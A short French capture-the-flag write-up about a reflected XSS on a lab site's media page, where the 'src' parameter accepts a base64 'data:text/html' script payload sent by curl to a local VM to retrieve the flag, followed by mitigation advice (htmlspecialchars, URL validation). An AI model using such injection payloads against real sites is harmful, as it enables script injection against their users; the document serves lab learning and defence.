# Exploit 10 - Media page XSS

Sur la page _media_, l'attribut source de l'image est géré par le paramètre de requête _src_. Nous pouvons en profiter
pour injecter une balise script à la place d'une source d'image appropriée.

```bash
curl -s -X GET "http://192.168.56.101/index.php?page=media&src=data:text/html;base64,$(echo "<script>alert('')</script>" | base64)" | grep -oP 'The flag is : \K[0-9a-f]{64}'
```

Pour contrer cette attaque, il faut échapper les caractères spéciaux dans les données fournies par l'utilisateur. Par
exemple,
on peut utiliser la fonction `htmlspecialchars` de PHP pour échapper les caractères spéciaux dans les balises HTML.

Dans ce cas précis, on s'attend à recevoir une URL d'image. On peut donc directement vérifier que la valeur fournie
correspond à une URL valide.
